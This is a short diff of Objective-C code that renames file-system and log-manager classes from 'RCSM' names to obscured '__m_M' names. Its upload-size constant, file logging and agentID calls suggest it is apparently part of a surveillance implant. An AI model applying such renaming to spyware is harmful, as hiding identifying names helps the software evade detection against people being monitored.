@@ -20,7 +20,7 @@
 #define FS_MAX_UPLOAD_CHUNK_SIZE  (25 *  1024 * 1024)
 
 
-@interface RCSMFileSystemManager (private)
+@interface __m_MFileSystemManager (private)
 
 - (NSMutableData *)_generateLogDataForPath: (NSString *)aPath
                                isDirectory: (BOOL)isDirectory
@@ -28,7 +28,7 @@
 
 @end
 
-@implementation RCSMFileSystemManager (private)
+@implementation __m_MFileSystemManager (private)
 
 - (NSMutableData *)_generateLogDataForPath: (NSString *)aPath
                                isDirectory: (BOOL)isDirectory
@@ -81,7 +81,7 @@
 @end
 
 
-@implementation RCSMFileSystemManager
+@implementation __m_MFileSystemManager
 
 - (BOOL)createFile: (NSString *)aFileName withData: (NSData *)aFileData
 {
@@ -192,7 +192,7 @@
           [innerPool release];
         }
       
-      RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+      __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
       BOOL success = [logManager createLog: agentID
                                agentHeader: rawAdditionalHeader
                                  withLogID: 0];
@@ -292,7 +292,7 @@
         }
     }
   
-  RCSMLogManager *logManager = [RCSMLogManager sharedInstance];
+  __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
   
 	[_fileManager fileExistsAtPath: aDirPath
                      isDirectory: &isDir];
